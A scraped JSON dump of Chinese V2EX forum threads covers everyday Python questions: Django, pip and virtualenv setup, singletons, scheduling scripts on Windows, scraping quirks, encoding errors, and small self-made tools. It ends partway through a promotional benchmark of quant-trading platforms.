{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 代码</p>\n<pre><code>def parse(self, data):\n    tmp = data\n    # funcs is a callable function iterator\n    for func in funcs:\n        tmp = func(tmp)\n    return tmp\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "以下迭代如何改为函数式？", "comment": ["reduce(lamda x, y: y(x), funcs, data)", "递归实现  判断 funcs", "funs = [(+1),(*2),(subtract 3)]\r", "f = foldr (flip (.)) id funs\r", "f 1", " 您这不是 Python 代码呀", "(fold-left (λ (tmp, func) (func tmp)) data funcs)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是一个很诡异的问题，搜了大半天，貌似得到的答案就是 Django 没有这个功能，问问小伙伴们可有折中的解决方案呢？</p>\n<p>场景如：</p>\n<p>订单的 ID 唯一且从 100000000 开始，自增+1 ，用的是 django 的 model ，不能直接修改数据库。</p>\n</div></div>"], "reply": "6", "tittle": "如何自定义 Django 主键自增的起始值？", "comment": ["在 建表的 migration 里加个 ALTER TABLE 的 SQL", " 这个确实是可以，但是已经违反了 django model 的定义，所以还是希望只在 model 中进行实现，而不修改数据库和 migration 中的 sql 文件", "我印象里 django (1.4 的源码) 的实现，创建新数据 sql insert 不带 prime key ，\r", "我自己实现的办法是 改 数据库里这个表的 auto increment 。", " 可还有其他解决方案呢？", " 刚用到这个用于 django 的测试，你是要我预先填充这么多数据？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://segmentfault.com/q/1010000008617728\" rel=\"nofollow\">https://segmentfault.com/q/1010000008617728</a></p>\n</div></div>"], "reply": "14", "tittle": "Python 中, 仿照经典代码实现单例, 却出现了不是单例的的状态, 代码哪里出错了 ?", "comment": ["python 中直接模块级常量就是单例", " 我的第一处代码是仿照经典实现,  而且自己也看不少书, 都是推荐这种写法\r", "\r", "我的疑惑在于: 是不是我写错了 ?", "单例模式 建议用 __new__，不是用 __init__", "应该用__new__只创建一个实例", " 你这是那里看到的推荐写法，“看了不少书”？你可以列出书名。另外楼上都是正解", "你这种写法只是共用一个类变量，但是每次都实例化 BackgroundScheduler", " 正解。", "还有，看了你给的链接 ", " \r", "人家写的没错，通过继承共用类变量来实现单例", " \r", "是不是我还要继承下( 我原以为那个继承, 就是做做样子的, 直接使用基类不就完了  :P )\r", "但是, 如果我使用 str 之类的, 就和他的完全保持一致了\r", "\r", "\r", "\r", "使用 __new__ , 见过, 但是没有深入了解其原理过\r", "\r", "\r", "清一色的 Borg 推荐: ", "\r", "\r", "\r", "但是都加了一个继承, 看起来那个继承, 不是我认为「多余的」\r", "\r", "\r", ":P", " \r", "\r", "反正各种解决方法就是了, 大家也木有一个统一的意见, 貌似也木有最佳实践了", " python 中最佳实践就是模块级常量", "模块，简单安全", "模块变量，简单的多线程锁就这么干的，跑的挺欢的", "可以试下这个单例装饰器，定义类的时候加在前面就行\r", "\r", "#!/usr/bin/env python\r", "# -*- coding: utf-8 -*-\r", "\r", "\r", "class SingletonDecorator:\r", "    def __init__(self, klass):\r", "        self.klass = klass\r", "        self.instance = None\r", "\r", "    def __call__(self, *args, **kwds):\r", "        if self.instance is None:\r", "            self.instance = self.klass(*args, **kwds)\r", "        return self.instance"]},
{"content": ["<div class=\"topic_content\">由于本地测试数据和生产机不同，偶尔还是会出现本地 OK ，生产机继续趴下的情况，大家一般用什么方式调试生产机？</div>"], "reply": "12", "tittle": "django/flask 项目，生产机上(Debug=False)出错，大家一般用什么方式调试？", "comment": ["看日志", "同楼上", "sentry", "改 debug 为 true ，修正后改回 false", "日志啊", "那说明是测试数据的问题啊\r", "试试有没有可能复制一部分生产数据用来测试\r", "随机抽点就行", "所以人家还有把测试服的数据库写入屏蔽掉，直接镜像真实请求做测试的", "sentry", "sentry 无疑", "添加 middware ， 捕捉所有异常", "sentry", "谢谢， sentry 功能确实不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://imgur.com/kC0cHpA\" rel=\"nofollow\">http://imgur.com/kC0cHpA</a></p>\n<p>图书目录如图所示</p>\n<p>所在地： 深圳\n价格京东书价的 5 折...\n全部打包拿走 8 折</p>\n<p>外地邮费可贵了，外地同学三思....</p>\n</div></div>", "<div class=\"topic_content\">已售：\r<br>  权威指南  \r<br>  函数式编程</div>", "<div class=\"topic_content\">结贴</div>"], "reply": "10", "tittle": "继续出一些前端书籍", "comment": ["[img]", "[/img]", "说错了  价格是 京东书价都 3 折", "js 的两本动物书要了。", " \r", "怎么联系？ 支持 Telegram 和微信。 QQ 也可以。", " qq  2593414781", "发错节点了...", "来晚了，如果带两本动物书我全收了，可惜这两本没了。我在深圳。", "压底的还在吗，楼主", "= = 单本五折，全部打包八折？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>可能是我没配对环境，反正 scrapy 现在用不了，就只能写正常脚本爬，除了加 time.sleep 还有啥注意事项啊，没用过几次 requests 库...</p>\n</div></div>"], "reply": "3", "tittle": "用循环爬网站子页面， requests,bs4，有什么要注意的么？", "comment": ["换 UA ，有条件就换 IP ，最好把不是必要的 BS4 解析移出去，比如最终需要的那个页面先别做结构化解析，保留 html 就好。另外注意列表页的互斥，尽量在爬列表页的时候保证列表的内容也没什么重复最好。", "配置 scrapy 环境， linux 比 windows 简单些。", "soup 解析，一般可以一行写完，用列表推导式"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>写了一个快递鸟的 Python client 。 求 start 、 fork ，一起完善。</p>\n<h1>链接</h1>\n<ul>\n<li>@github: <a href=\"https://github.com/menduo/kdniao_python\" rel=\"nofollow\">https://github.com/menduo/kdniao_python</a></li>\n<li>@oschina: <a href=\"https://git.oschina.net/menduo/kdniao_python\" rel=\"nofollow\">https://git.oschina.net/menduo/kdniao_python</a></li>\n</ul>\n<h1>截图（终端）</h1>\n<p><img alt=\"\" src=\"https://git.oschina.net/menduo/kdniao_python/raw/master/asset/menduo_kdniao_py.png\"></p>\n<h1>Install 安装</h1>\n<pre><code>pip install -u kdniao\n</code></pre>\n<h1>Usage 使用</h1>\n<h2>依赖</h2>\n<p>无论是在程序里，还是在命令行中，你都必须先获得快递鸟官方分配给你的 app id 及 app key 。</p>\n<p>在命令行运行 <code>kdniao</code> 命令时，需要在命令行参数中指定 id 与 key ，或者预先在环境变量中指定 <code>KDNIAO_APP_ID</code> 及 <code>KDNIAO_APP_KEY</code>。如：</p>\n<ol>\n<li><code>KDNIAO_APP_ID={你的 ID} KDNIAO_APP_KEY={你的 Key} kdniao {运单号}</code>，或：</li>\n<li>在 <code>~/.bash_profile</code> 中设置变量，并重新打开 shell 执行: <code>kdniao {运单号}</code>，或:</li>\n<li><code>kdniao {运单号} --ik={APP_ID},{APP_KEY}</code></li>\n</ol>\n<h2>Command Line 命令行</h2>\n<pre><code>$ kdniao {运单号} --s=快递公司编码 --o=订单号 --ik={APP_ID},{APP_KEY}\n\n# 如：\n# $ kdniao 12345678 --s YTO\n# $ kdniao 12345678 --ik={APP_ID},{APP_KEY}\n</code></pre>\n<h1>更多介绍</h1>\n<p><a href=\"https://github.com/menduo/kdniao_python\" rel=\"nofollow\">https://github.com/menduo/kdniao_python</a></p>\n<p>求 start 、 fork ，一起完善。</p>\n<p>menduo/kdniao_python: 快递鸟 kdniao python sdk, with tornado async http client support. <a href=\"https://github.com/menduo/kdniao_python\" rel=\"nofollow\">https://github.com/menduo/kdniao_python</a></p>\n</div></div>"], "reply": "4", "tittle": "快递鸟 kdniao Python sdk，支持 tornado 异步客户端", "comment": ["注册还得认证...", " 不需要吧，我记得当时就用手机号验证了一下就可以使用大部分接口了。", "支持   打算使用", " 欢迎使用，有问题及时联系。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在网上查了一些资料，我尝试使用 windows 下的任务计划程序，但是，重复任务间隔只有 5 分钟~1 个小时的，请问每隔 3 小时如何设置呢？</p>\n</div></div>"], "reply": "23", "tittle": "windows 系统下如何每隔 3 个小时执行一次 Python 脚本", "comment": ["直接 python 里用循环执行 time.sleep 不就好了", "好久没写 python ，可不可就搞一小时，然后设置一个计数器，算到三才执行程序", "windows 的任务计划就可以。选重复间隔时间那里除了可以从下拉框选也可以手动输入。", "我记得我之前用过 win 下的貌似和 at 一样的计划任务工具， win10 ，貌似 win 自带的，你去找下计划任务的命令， cmd 下就可以做到，很好用", "计划任务，选 1 小时，然后把 1 改为 3", "计划任务那里手动可以改的吧", "定时任务框架 APScheduler", "schtasks /create /sc minute /mo 60 /tn \"test\" /tr C:\\1.exe\r", "\r", "这是每 60 分钟\r", "本质上还是计划任务", " “下拉框选也可以手动输入”\r", "\r", " “计划任务那里手动可以改的吧”\r", "正解！我看是下拉框，就没有想过能改。。。谢谢啦！", "计划任务 可以的", " 确实可以，是我大意了！谢谢大家回复！:)", "windows 自带 定时任务  写个 bat 文件，在文件里面执行 python 就好。", " 我在“操作“里直接用 python.exe 文件路径 参数也添加了，虽然执行了，但是没有效果。。。写一个 bat ，执行 python ，就好了。", "不管 Py 还是什么，脚本类的应该都可以采用“写一个 bat ，然后使用系统自带的计划任务实现定时重复执行”这个方法。", "计划任务\r", "linux 是 crontab", " 渣渣 crontab", " 那应该用啥?", "用 systemd.timer 吧。", "呃，不对， windows 是计划任务。", "计划任务最靠谱，线程休眠挂掉的概率远高于系统定时执行\r", "\r", "同理与 Linux 下也推荐使用 cron 来定时执行各种指定间隔的程序", "计划任务", "计划任务每分钟执行一次，每次 pyton 里面计数也行，判断时间也行，怎么都可以。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>爬取地址： <a href=\"https://tieba.baidu.com/p/4959928798\" rel=\"nofollow\">https://tieba.baidu.com/p/4959928798</a>\n在 chrome 上查看源代码，有着一段</p>\n<pre><code>  &lt;a class=\"pb_nameplate j_nameplate j_self_no_nameplate\" href=\"/tbmall/propslist?category=112&amp;ps=24\" data-field='{&amp;quot;props_id&amp;quot;:&amp;quot;1120050972&amp;quot;,&amp;quot;end_time&amp;quot;:&amp;quot;1512731564&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;\\u6d77\\u8d3c\\u738b\\u7684\\u53f3\\u624b&amp;quot;,&amp;quot;optional_word&amp;quot;:[&amp;quot;\\u7684&amp;quot;,&amp;quot;\\u4e4b&amp;quot;,&amp;quot;\\u306e&amp;quot;],&amp;quot;pattern&amp;quot;:[&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;,&amp;quot;2&amp;quot;,&amp;quot;3&amp;quot;,&amp;quot;3&amp;quot;]}' target=\"_blank\"&gt;海贼王的右手&lt;/a&gt;\n</code></pre>\n<p>依据： class=\"pb_nameplate j_nameplate j_self_no_nameplate</p>\n<p>写了一个正则：(?&lt;=pb_nameplate\\sj_nameplate\\sj_self_nameplate)[\\s\\S]*?(?=)</p>\n<p>运行后发现死活匹配不了，所以</p>\n<pre><code># -*- coding: utf-8 -*-\n__author__ = 'duohappy'\n\nimport requests\n\ndef get_info_from(url):\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\"\n    }\n\n    web_data = requests.get(url, headers=headers)\n    web_data.encoding = 'utf-8'\n    content = web_data.text\n    \n    with open('./test.txt', 'w') as f:\n        f.write(content)\n\nif __name__ == '__main__':\n    url = 'http://tieba.baidu.com/p/4959928798'\n    \n    get_info_from(url)\n    \n</code></pre>\n<p>才发现</p>\n<pre><code>&lt;a class=\"pb_nameplate j_nameplate j_self_nameplate\" href=\"/tbmall/propslist?category=112&amp;ps=24\" data-field='{&amp;quot;props_id&amp;quot;:&amp;quot;1120050972&amp;quot;,&amp;quot;end_time&amp;quot;:&amp;quot;1512731564&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;\\u6d77\\u8d3c\\u738b\\u7684\\u53f3\\u624b&amp;quot;,&amp;quot;optional_word&amp;quot;:[&amp;quot;\\u7684&amp;quot;,&amp;quot;\\u4e4b&amp;quot;,&amp;quot;\\u306e&amp;quot;],&amp;quot;pattern&amp;quot;:[&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;,&amp;quot;2&amp;quot;,&amp;quot;3&amp;quot;,&amp;quot;3&amp;quot;]}' target=\"_blank\"&gt;海贼王的右手&lt;/a&gt;\n</code></pre>\n<p>class=\"pb_nameplate j_nameplate j_self_no_nameplate\n变成了\npb_nameplate j_nameplate j_self_nameplate</p>\n<p>这是什么技术，还是我的姿势有问题？</p>\n</div></div>"], "reply": "12", "tittle": "爬虫的时候发现一个有趣的现象，请问这是怎么回事？", "comment": ["正则- > 网页解析\r", "\r", "\r", "（源码的改变或许是因为你从 chrome 里看的和你真实爬到的不一致？）", " 正则- > 网页解析器", " 对，我爬到的网页代码，和直接在 chrome 查看网页源代码有差异，这个还是第一次遇到", "呵呵 我刚试了下 ， 应该是你网页登录了， 脚本没有登录。\r", "导出为 curl 命令行，可以对比一下带 cookie 内容跟不带 get 后的内容。", "楼主试试把 headers 伪造的完整一点呢，也有可能是 js 动态执行的缘故", "你是查看源代码 还是 f12 的检查元素", "如果出问题一般都用笨方法，开始的时候先输出爬到的全文，根据爬到的全文做解析，而不是看网页", " 确实如此，我退出贴吧账号后，再查看源代码，就没有问题！谢谢啦！厉害", " 嗯嗯，一次一定会注意", "原因被 @", " 指出了，是登录的问题！\r", "谢谢大家关注", "代码不错，会不会跟服务器有关呢？", "用 firefox 或者 chrome 的时候记得装个 js 开关。这样你就能看到没有 js 修改 DOM 的界面效果了。"]},
{"content": ["<div class=\"topic_content\">刚用 mac 一段时间，平时用到 python 比较多\r<br>平时安装各种包的命令包括:\r<br>pip install xxx\r<br>sudo pip install xxx\r<br>pip install --user xxx\r<br>brew install xxx\r<br>以及一些手动安装\r<br>...\r<br>\r<br>并不知道这几条命令有什么区别，但是今天突然发现有两个目录：\r<br>/usr/local/lib/python2.7/site-packages\r<br>/Library/Python/2.7/site-packages\r<br>两个目录下面各有一些安装包...\r<br>\r<br>求解这两个目录有何区别？是 osx 自带的 python 和我自己安装的 python 的目录吗？\r<br>\r<br>ps.我知道不应该用 sudo pip install\r<br>pps.那加上--user 有什么作用呢\r<br>ppps.看到有人说一切都应该用 virtualenv ，我以后会注意的 TAT</div>"], "reply": "8", "tittle": "mac 里两个 Python 的 site-packages 目录的区别", "comment": ["/usr/local 那个是 homebrew 的吧", "OSX 升级造成的，后者是 10.9 的目录", " 我查了 brew 的目录应该是 /usr/local/Cellar", " 诶那为什么还一直存在", "确实应该采用 pyvenv 或 virtualenv, 对于 python3 来说直接可以用 pyvenv （我不清楚 mac 下是否可以啊，因为我在 mac 下用的 python 2.7 ，而在 CentOS7 下用的 python 3.5 ，就是用 pyvenv 建立的虚拟环境）\r", "\r", "pip 最好安装到用户目录，我反正一直采用 --user 参数安装, pip install --user xxx 会把 xxx 安装到 $HOME/Library/Python 目录下，不采用 --user 参数则安装到 /Library/Python 目录去了", " 那 /usr/local...那个是什么呢？涨知识了，谢谢", " 我也不知道啥子原因，我猜测是不是你采用了源码安装某些 python 包，有些源码包安装的 PREFIX 缺省情况下是 /usr/local/...", " 还有个现象， PIL 这个库我没安装过，但 /Library...下有， pycharm 能检测到，终端就不行……好凌乱，我电脑上还有 N 个 python 解释器， 2.6 2.7 3.5..."]},
{"content": "", "reply": "目前尚无回", "tittle": "请教下 微店和有赞的\"淘宝搬家\"功能是如何实现的 23333", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>基本的代码是这样：</p>\n<p>import codecs</p>\n<p>filename = u\"测试.doc\"</p>\n<p>with codecs.open(filename, 'w', 'utf-8') as f:</p>\n<pre><code>f.write(\"lalala\")\n</code></pre>\n<p>就是这样简单的写入一个文件，在本地的 Mac 上是 OK 的，在 ubuntu 服务器上 python 解释器的交互环境里执行也没问题，但是写成一个 Tornado 的 handler 就报 UnicodeEncodeError 了，很奇怪，文件头部是写有# -<em>-coding:utf8 -</em>-编码声明的，也试过 reload(sys)， sys.setdefaultencoding('utf-8')这样的修改系统文件编码，还是报原来的错，求各位指点。</p>\n</div></div>"], "reply": "4", "tittle": "求助：遇到奇怪的 python2 编码问题", "comment": ["你用 print sys.getdefaultencoding()获取一下当前的编码方式，我怀疑你代码写得有问题，不是 utf8 编码", "你是说在 f.write 的时候报错吗？", " @", " 谢谢你们的回复， sys.getdefaultencoding()得到的是 ascii ，可是我之后加上 reload(sys)， sys.setdefaultencoding('utf-8')，仍然用 sys.getdefaultencoding()得到编码是 utf-8 了，后面再进行文件的写入，还是报错，错误是在 with 那一行。另外，把 filename 改成\"测试.doc\"即 str 类型的, 就能成功执行了，估计还是跟运行环境有关，可是在同样的环境下，在 python 解释器里一行一行执行，也是成功的，真是费解", "你虽然在 tornado 中把编码修改了，但是对于字面量 u\"测试.doc\" 已经强制用 unicode 了，你需要转换成 utf8 ，或者改成字符串类型"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python2.7 用 pip 安装了 Django,Python3.5 用 pip3 安装了 Django ，然后建工程</p>\n<pre><code>django-admin startproject mysite\n\n</code></pre>\n<p>比如我想同时建一个 2.7 的工程和 3.5 的工程。怎么指定 Python 版本啊。</p>\n</div></div>"], "reply": "6", "tittle": "pip 和 pip3 同时安装 Django 的问题，建工程怎么指定 Python 版本啊", "comment": ["环境变量", "恐怕 pyvenv 或 virtualenv 才是解决之道哦", "virtualenv  应该是一个 prework 了.", "建议用 pyenv 来管理多个版本的 python 环境", "看了一下 django-admin 文件的源码， django-admin 文件在 python2 和 python3 下都能跑，所以能这么做：\r", "\r", "python2  $(which django-admin)\r", "python3 $(which django-admin)\r", "\r", "当然，还是维护多个项目，还是推荐使用 virtualenv 。", "看一下 ", "\r", "点我头像，看简介，可以加群沟通，这样效率比较高"]},
{"content": ["<div class=\"topic_content\">想在 python2.7 中安装一个 tensorflow 的包，然而发现最近输入 pip ，会直接把这个包安装到 python3 中\r<br>\r<br>请问如何把 pip 默认的 python 版本改到 python2.7 里面啊？\r<br>\r<br>小白求助</div>"], "reply": "6", "tittle": "关于 pip 默认指向的 Python 版本", "comment": ["Python 2.7 -> pip2 install \r", "Python 3 -> pip3 install", "vim `which pip` -> 修改第一行指向的 python", " 忘记说了，我用的不是 vim ，是直接在 terminal 上运行的。。。", " @", "   感谢两位的帮助，不知为何现在又恢复正常了。。。解决方案：把 terminal 关掉，再打开，重复两次就又恢复回去了。。。。感觉这个问题可能和我尝试了一下 sudo easy_install -U pip 有关。。。虽然还是不懂为什么。。。。", " ... 你大概没理解意思\r", "pip 本身就是个 python script 然后给了 x 权限而已", "$ pip -V  # 看看使用的 pip 对不对\r", "\r", "$ pip show <installed-package>  # 看看 Location 字段的值"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>简介</h2>\n<p><img alt=\"\" src=\"https://github.com/gaojiuli/xweb/raw/master/logo.png\"></p>\n<p>众所周知, 如今的后端开发主要是负责接口的开发, 而前后端分离又是当下最流行的. 如果使用 python 技术栈, 通常情况下我们会选择 flask 全套,django,或者 tornado. 他们的模板引擎, session 功能在当下的后端开发中是基本不用的. 同时由于它们开始的时候是基于 python2 写的, 造成了现在代码中充斥着大量丑陋的兼容性代码. 再次, 它们依赖的许多第三方库也包含了许多为 python2 写的代码, 这样造成了恶性循环, 学习它们的源码必须要学习 python2 中一些被淘汰的东西, 而我们可能只是想看看其中某些功能的逻辑而已. 因此, 我用极少的代码实现了一个极简的 web 框架 xweb.(项目地址:<a href=\"https://github.com/gaojiuli/xweb\" rel=\"nofollow\">https://github.com/gaojiuli/xweb</a>)</p>\n<h2>理由</h2>\n<p>xweb 摒弃了一切为了 python2 而写的代码, 因此代码量特别少, 看过 xweb 源码的人都知道, 它的逻辑非常清晰, 代码也是很容易理解的.</p>\n<p>xweb 不包含任何第三方库, 这让大家的学习成本进一步降低. 因为吸收了 flask, bottle, sanic 等框架中的一些优点, 我精简了 xweb 的 api, 使得上手轻松, 学习成本极低.</p>\n<p>xweb 是基于 wsgi 写的, 因此所有适合 flask 的部署方法, xweb 也都支持.</p>\n<p>使用 xweb 写出的接口代码, 别人很容易理解, 别人也能很容易参与进开发.</p>\n<h2>怎么用</h2>\n<p>v2ex 帖子: <a href=\"https://www.v2ex.com/t/345653\" rel=\"nofollow\">xweb: 一款无依赖的 Python web 框架(低于 500 行代码)</a></p>\n<p>(项目地址:<a href=\"https://github.com/gaojiuli/xweb\" rel=\"nofollow\">https://github.com/gaojiuli/xweb</a>)</p>\n<p>xweb 的 README 就是全部文档了, 短短一页就表述清楚了所有 api.</p>\n<h2>目的</h2>\n<p>让 web 开发的学习成本降到最低, 不管是开发也好, 源码学习也好, xweb 都是非常推荐使用的.</p>\n<p>xweb(web 框架) + xorm(ORM 库,未写) + xparser(数据验证库,未写).构成一个完整体系, 它们共同特点是源码简洁, api 精简, 摒弃 python2. 这个体系会使得后端接口开发更加容易, 接口代码也更加优雅. 如果有朋友对我的想法有兴趣, 可以一起参与进来.</p>\n<h2>The Zen</h2>\n<p>Beautiful is better than ugly.</p>\n<p>Explicit is better than implicit.</p>\n<p>Simple is better than complex.</p>\n</div></div>"], "reply": "12", "tittle": "xweb: 后端开发应该是简洁的, 禅意的", "comment": ["支持一下", " 多谢", "支持！", "已 unstart", " 😀", "一直用 bottle 干这样的事情，你得超越它啊。", " 谢谢你的支持。", "我觉得更像一个原型产品。 毫无新意。", " +1", "已支持", "作为一个业余 python ，随便说说。\r", "\r", "web.py bottle django flask 一路用来，有 7 年了，都是写工作无关的 app ，非生产，现在只用 django 和 flask 。\r", "\r", "django 就不说了，概括就是一应俱全。\r", "\r", "flask 对比 web.py 和 bottle 的优势很大来自于无数方便的第三方扩展，我想用 orm 只需要 pip 个 flask-sqlalchemy ，想用管理后台只要 pip 个 flask-admin 。\r", "\r", "扩展性好，扩展资源丰富，尽可不需要自己造轮子，这才是 flask 成功的原因吧。\r", "\r", "\r", "一个太简洁的框架，也意味着使用过程中需要自己造太多的轮子，这感觉很不 python ，用业余的角度，感觉很难成功.....", " 我这样是为了低耦合, 后续我会实现 orm 与 validator 功能.\r", "由于它们之间是互相独立的, 因此可以随意用到其他地方.\r", "分开开发不同库的好处你应该可以理解吧 ?\r", "\r", "以后使用 xweb + xorm +xdata 能够快速实现开发. \r", "而单独的 xweb 只负责 request 的接收,以及 response 的返回."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>###DramasUpdate</p>\n<p>Github:<a href=\"https://github.com/SgtDaJim/DramasUpdate\" rel=\"nofollow\">DramasUpdate</a><br>\n自动获取<a href=\"www.zmz2017.com\" rel=\"nofollow\">人人字幕组</a>中收藏的美剧的最新连载的 ed2k 链接，并将链接发送到用户邮箱。</p>\n<p><strong>感谢人人字幕组对美剧爱好者做出的贡献！</strong></p>\n<p>效果图：<br>\n<img alt=\"\" src=\"http://p1.bpimg.com/567571/d6497806c43c7a91.png\"></p>\n<p>###51cto_signup</p>\n<p>Github:<a href=\"https://github.com/SgtDaJim/51cto_signup\" rel=\"nofollow\">51cto_signup</a></p>\n<p>自动登录 51CTO ，进行签到领取无忧币、领取下载豆等动作。释放碎片时间。</p>\n<p>效果图：<br>\n<img alt=\"\" src=\"http://p1.bqimg.com/567571/891c1277da3d7527.png\"></p>\n<p>各位大神，求指导下改进的地方和代码风格建议！\n脚本原理简单。。求轻喷。。。</p>\n</div></div>"], "reply": "6", "tittle": "自己弄的两个脚本。。求指导。。", "comment": ["不错支持下，最近正准备用 PHP 写一个。", "支持一下  虽然我可能用不到。。", "lz 为什么不用 requests ==", " 因为刚学 python3 的时候就用习惯了 urllib 。。 requests 有什么优点吗？", " 谢谢支持！", " 谢谢！"]},
{"content": ["<div class=\"topic_content\">大家好，我想做个社交网站，想找个有经验的同学帮我做个网站，含注册、发布帖子、回复、上传照片、购买、支付，我没有很多钱，就是自己攒的一些，我可以跟你一起做，你安排我任务，同时也跟你学习。\r<br>\r<br>有没有感兴趣的，能帮我搞个的？\r<br>\r<br>我 Q 1642302522</div>"], "reply": "8", "tittle": "我想找个朋友帮我做个网站，同时也跟他一起学习", "comment": ["希望能跟着一起做，跟着学，同时把我这个项目做下来。", "怎么都每人回复，这个帖子发上去了吗？", "所以，你是想找个免费帮你工作的师傅？", "不是啊，我给钱啊，但是别太多了，太多了我也没那么多钱啊。", "爱莫能助", "怎么都没有人呢。。愁银", "你当这个世界都是你爹妈吗？", "说什么话呢？不明白这里哪儿说错了？上面有任何一个地方涉及到侵犯你权利或者让你白做事了吗？你知道我给多少钱吗？你知道做什么吗？神经病，你在什么都没清晰，直接就来喷,你爹妈就教你进入社会就到处张嘴喷粪?你这样的性格,估计也没什么出息。我掏钱，找人给我做事，你情我愿，就干，不情愿就算，这里面有什么说错的嘛？干的事包括做后台，另外加上我需要和对方学习请教，这中间有什么毛病吗？真有病!\r", "算了，撤掉这个内容，这个事，不在这里做了， QQ 群发个外包项目一堆人!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&gt;&gt;&gt; dateutil.parser.parse(\"2017-03-09T09:32Z\")\ndatetime.datetime(2017, 3, 9, 9, 32, tzinfo=tzutc())\n&gt;&gt;&gt; t1=dateutil.parser.parse(\"2017-03-09T09:32Z\")\n&gt;&gt;&gt; t2=dateutil.parser.parse(\"2017-03-09T09:32Z\").astimezone(dateutil.tz.tzstr(\"GMT+0800\"))\n&gt;&gt;&gt; t1-t2\ndatetime.timedelta(0)\n&gt;&gt;&gt;\n&gt;&gt;&gt; t1\ndatetime.datetime(2017, 3, 9, 9, 32, tzinfo=tzutc())\n&gt;&gt;&gt; t2\ndatetime.datetime(2017, 3, 9, 17, 32, tzinfo=tzstr('GMT+0800'))\n&gt;&gt;&gt; t1-t2\ndatetime.timedelta(0)\n&gt;&gt;&gt; t2.strftime(\"%s\")\n'1489051920'\n&gt;&gt;&gt; t1.strftime(\"%s\")\n'1489023120'\n&gt;&gt;&gt;\n</code></pre>\n<ul>\n<li>datetime parse 的时候直接不管时区</li>\n<li>时间相等的 datetime 对象生成的时间戳居然不一样</li>\n</ul>\n<p>为了方便小白理解？遇到好几个人觉得不同时区的时间戳不一样了……说不定是 Python 的锅</p>\n</div></div>"], "reply": "13", "tittle": "有人吐槽 Python 的时间处理模块吗？", "comment": ["不要用原生的时间处理模块，用第三方的库。比较有名的是 arrow\r", "感谢...看来看去还是 go 的比较舒服", "自己不看文档还怪 python 咯？\r", "datetime.datetime 传的参数是本地时间，输出 timestamp 是是要转换到 UTC 的，你指定的时区不同，转换到 UTC 后当然不一样。\r", "parse 的时候 2017-03-09T09:32Z 里面的 Z 就是 0 区的意思，你拿两个相同的时间相减，当然是等于 0 了。", " 好一个 `输出 timestamp 是是要转换到 UTC 的`", "go 的时间模块也被吐槽的不行啊", "推荐 pip install arrow\r", "享受更好的时间处理", "自带电池，只能让你享受一定程度的方便。（总比没电池好）\r", "\r", "想更爽地使用，当然是插上电源，接通更人性化更现代的库， arrow, requests ， jinja2 ， lxml 。。。\r", "\r", "难道你还用 urllib, str.format, etree ？", "Python 渣表示，你贴出的示例，哪一条不好理解呢？我看着都没问题啊\r", "最后一个 strftime ，你用的%s 小写 s 是啥意思呢， ", " 官方文档中并没有小写 s 的 format", " \r", "\r", "go 的 time 真的舒服嘛……", " 起码比较容易理解...", "说 go 比 python 自带电池爽我也是没明白。。", "不错了，\r", "我在用 python 写时间时也郁闷过，相似功能的库太多了，一点都不正交，也不 pythonic\r", "结果偶尔去写了个 js ，发现 js 居然没有内置时间格式化的函数，还得自己手撸，这才惨呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 python 的量化平台目前很多啊，现在就三家**ricequant,joinquant,<a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">raquant</a>**做一下简单评测</p>\n<h1>[分钟级别] 回测速度比较</h1>\n<p>同样一段双均线（ SMA 长短线）策略，虽然这个双均线，没必要每分钟都刷，毕竟作为超短期指标，双均线意义不大。</p>\n<p>所以这也是让策略开发者困扰的一点，有时候有些策略的逻辑在“被选择的频度”下面毫无意义。镭矿则没有这一困扰，镭矿策略代码里面规定是什么频度执行就是什么频度执行。</p>\n<p>言归正传，现在我们来用这个经典策略对比一下各个平台，分钟频度下一年半(2015-05-01 到 2017-01-01 ）的回测速度。每分钟刷日线数据肯定是更没有意义，所以小编将 ricequant 和 joinquant 的获取历史数据的参数手动改为获取分钟数据</p>\n<pre><code> 策略 A:\n 回测时间： 2015-05-01 至 2017-01-01\n 使用分钟数据，短均线上穿长均线，则买入，反之，则清仓卖出\n</code></pre>\n<p>对篇幅很恐惧的同学请先看一下这个表格：</p>\n<p>策略 A 的回测时间对比表格</p>\n<ul>\n<li><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a> \t<strong>17 秒</strong></li>\n<li>ricequant \t<strong>3 到 4 分钟</strong></li>\n<li>joinquant \t<strong>表现好的时候 6 分钟</strong></li>\n</ul>\n<p>下面是<a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a>的代码，耗时 17 秒</p>\n<pre><code>def init(context):\n    context.s1=\"sha-600000\"\n    sma12_factor=SMAFactor(12,\"close\")\n    sma30_factor=SMAFactor(30,\"close\")\n    reg_factor(\"sma12\",sma12_factor)\n    reg_factor(\"sma30\",sma30_factor)\ndef every_minute(context,data):\n    stock=context.s1\n    ma12=factor_output(\"sma12\",context.s1,\"m1\")[\"sma12\"]\n    